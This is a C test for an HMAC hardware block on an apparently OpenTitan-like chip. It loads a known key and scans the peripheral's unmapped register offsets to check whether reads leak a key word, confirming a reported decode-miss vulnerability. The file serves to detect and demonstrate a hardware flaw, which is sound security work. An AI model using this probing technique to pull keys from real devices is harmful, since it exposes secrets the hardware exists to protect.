#include "dt/dt_hmac.h"
#include "sw/device/lib/base/abs_mmio.h"
#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/base/memory.h"
#include "sw/device/lib/runtime/log.h"
#include "sw/device/lib/testing/test_framework/check.h"
#include "sw/device/lib/testing/test_framework/ottf_main.h"
#include "sw/device/lib/dif/dif_hmac.h"

OTTF_DEFINE_TEST_CONFIG();

bool test_main(void) {
  // Initialize HMAC using DIF only to load a known, controllable key into the
  // HMAC internal secret registers. DIF is used here only for initialization
  // convenience; the actual leakage check uses low-level MMIO accesses.
  dif_hmac_t hmac;
  dt_hmac_t kHmacDt = kDtHmac;

  CHECK_DIF_OK(dif_hmac_init_from_dt(kHmacDt, &hmac));

  // Construct a clearly identifiable 256-bit key consisting of distinct
  // 32-bit words. We will check whether any unmapped read returns the
  // third word (index 2) of this key.
  const uint32_t key_words[8] = {
      0x11111111u, 0x22222222u, 0x33333333u, 0x44444444u,
      0x55555555u, 0x66666666u, 0x77777777u, 0x88888888u,
  };
  uint8_t key_bytes[32];
  // Copy words into a byte array in host little-endian order.
  memcpy(key_bytes, key_words, sizeof(key_bytes));

  // Prepare a transaction config for loading the key. We only load the key
  // and do not start an HMAC transaction that computes a digest.
  const dif_hmac_transaction_t config = {
      .digest_endianness = kDifHmacEndiannessLittle,
      .message_endianness = kDifHmacEndiannessLittle,
      .digest_size = kDifSHA256,
      .key_length = kDifHMACKey256,
  };

  // Start HMAC in HMAC mode with the provided key. This causes the HMAC IP to
  // load the 256-bit key into its internal key registers.
  CHECK_DIF_OK(dif_hmac_mode_hmac_start(&hmac, key_bytes, config));

  // Expected leaked word value (word index 2) - matches key_words[2].
  const uint32_t expected_leak = key_words[2];

  // Base address of the HMAC peripheral from the top-level autogen header.
  // This constant is provided by the "//hw/top_earlgrey/sw/autogen:top_earlgrey"
  // dependency in the BUILD file.
  const uintptr_t base = (uintptr_t)TOP_EARLGREY_HMAC_BASE_ADDR;

  LOG_INFO("HMAC base address: 0x%08" PRIxPTR, base);
  LOG_INFO("Probing HMAC register space for unexpected returns of 0x%08x",
           expected_leak);

  // Probe a broad range of offsets within the HMAC peripheral window. The
  // vulnerability reported is triggered when an unmapped read (decode miss)
  // causes the default read-data mux to drive out reg2hw.key[2].q. Since the
  // set of implemented register offsets is relatively small, we probe a
  // larger area and report any offset that returns the expected key word.
  // Note: This test intentionally uses low-level absolute MMIO reads to
  // exercise the TL-UL read-data path directly.
  int matches = 0;
  for (uintptr_t offset = 0x0; offset <= 0x400; offset += 4) {
    uint32_t val = abs_mmio_read32(base + offset);
    if (val == expected_leak) {
      LOG_INFO("Match at offset 0x%03" PRIxPTR ": 0x%08x", offset, val);
      ++matches;
    }
  }

  // If any probe returned the expected key word, this indicates leakage.
  // We do not assert on the exact offsets here because the set of defined
  // registers varies across IP versions. The presence of the key word in
  // reads from locations that are not documented register addresses is a
  // definitive sign of the reported vulnerability.
  CHECK(matches > 0, "No leakage observed: HMAC key word not returned on any probe");

  LOG_INFO("HMAC unmapped read leakage detected: %d matches", matches);

  return true;
}
